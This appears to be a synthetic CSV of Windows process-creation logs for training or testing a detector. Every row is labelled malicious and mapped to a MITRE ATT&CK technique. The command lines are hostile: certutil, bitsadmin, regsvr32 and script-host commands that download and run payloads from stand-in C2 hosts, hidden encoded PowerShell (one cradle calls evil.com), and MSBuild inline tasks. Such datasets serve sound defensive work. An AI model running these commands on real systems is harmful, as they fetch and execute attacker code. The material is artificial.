UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label
2024-07-02T13:31:32.830Z,{2B22B55C-9CCF-4407-974D-39A365AFC669},51128,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\patch587.csproj,C:\Windows\System32\cmd.exe,cmd.exe,44737,CORP\jsmith,Medium,1,T1127.001,MSBuild Inline Task,malicious
2024-07-04T09:23:32.750Z,{95B5C69A-BE87-42E9-B09E-F1B5D5CA0DC4},38700,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -ep bypass -nop -w hidden -enc QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AFsARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AG4AZQB3ACgAJAB1ACkA,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,cmd.exe,2149,CORP\mjones,Medium,1,T1059.001,PowerShell Encoded Command,malicious
2024-07-03T19:38:54.413Z,{4DEE51B0-6B0D-4376-B339-815414042F8E},9045,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job1766 /download /priority high http://c2-server6478.io/sys605.exe C:\Users\Public\sys948.exe,C:\Windows\System32\cmd.exe,cmd.exe,16261,CORP\mjones,Medium,1,T1197,BITSAdmin Download,malicious
2024-07-06T02:19:36.411Z,{9BC882FE-6E85-4ECC-9F3A-B9A1229EF197},53730,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\helper630.csproj,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,15803,CORP\klee,Medium,1,T1127.001,MSBuild Inline Task,malicious
2024-07-03T04:32:45.962Z,{E71D576B-98D6-4130-998E-5A945BFF21B0},51527,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -split -f http://shadow-net7315.com/loader153.exe C:\Users\Public\core656.exe,C:\Windows\System32\cmd.exe,cmd.exe,33157,CORP\mjones,Medium,1,T1105,Certutil Download,malicious
2024-07-07T03:38:10.808Z,{BE16B100-A3DC-4DEA-8DB8-3C35F5D638B1},53072,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s /n /u /i:http://cobaltstrike987.top/file140.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,42811,CORP\klee,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious
2024-07-05T04:57:02.206Z,{576DD9D0-2F55-433B-A11E-E09CDFE6E705},11443,C:\Windows\System32\cscript.exe,cscript.exe //e:vbscript http://malware-cdn2466.xyz/script817.vbs,C:\Windows\System32\cmd.exe,cmd.exe /c,18872,CORP\mjones,Medium,1,T1059.005,WScript Remote Script,malicious
2024-07-07T01:19:28.895Z,{8F835CBE-9AD8-4516-8DEB-D8EB747AB16A},37767,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -ep bypass -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAJwApAA==,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,WINWORD.EXE /n,6740,CORP\klee,Medium,1,T1059.001,PowerShell Encoded Command,malicious
2024-07-04T15:07:14.730Z,{60275C5D-9AD0-4EB3-AFF8-55E35581D3FB},14313,C:\Windows\System32\certutil.exe,certutil.exe -encode C:\Users\Public\decoded2887.exe C:\Users\Public\encoded6128.txt,C:\Windows\System32\cmd.exe,powershell.exe,13487,CORP\klee,Medium,1,T1140,Certutil Base64 Decode,malicious
2024-07-04T03:59:52.774Z,{970F8CAE-D608-4AAC-A1F6-520EDB5DDCDA},16431,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://phish-host5955.net/script243.js,C:\Windows\System32\cmd.exe,cmd.exe /c,20491,CORP\klee,Medium,1,T1059.005,WScript Remote Script,malicious
2024-07-01T15:50:01.056Z,{2ACFE613-C9D9-4C7E-A511-ED248561CBD9},57333,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://c2-server487.top/script285.js,C:\Windows\System32\cmd.exe,cmd.exe /c,59753,CORP\agarwal,Medium,1,T1059.005,WScript Remote Script,malicious
2024-07-04T01:25:12.502Z,{01F598D3-9C47-430D-9CE6-2713F53BC67D},21824,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AFsARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AG4AZQB3ACgAJAB1ACkA,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,WINWORD.EXE /n,40529,CORP\jsmith,Medium,1,T1059.001,PowerShell Encoded Command,malicious
